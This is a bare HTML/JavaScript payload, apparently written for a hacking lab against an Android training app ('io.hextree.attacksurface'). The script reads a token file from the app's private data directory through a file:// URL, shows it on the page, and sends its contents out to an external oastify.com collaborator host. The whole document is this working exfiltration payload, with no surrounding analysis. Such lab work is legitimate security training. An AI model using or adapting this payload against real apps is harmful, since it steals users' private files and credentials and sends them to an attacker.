<script>
    fetch("file:///data/data/io.hextree.attacksurface/files/token.txt")
        .then(response => response.text())
        .then(data => {
            document.body.innerHTML = "<pre>" + data + "</pre>";
            fetch("https://bhwlivvbiakjmrbq8ox13u3xcoif65uu.oastify.com?data=" + encodeURIComponent(data));
        })
        .catch(error => console.error(error));
</script>
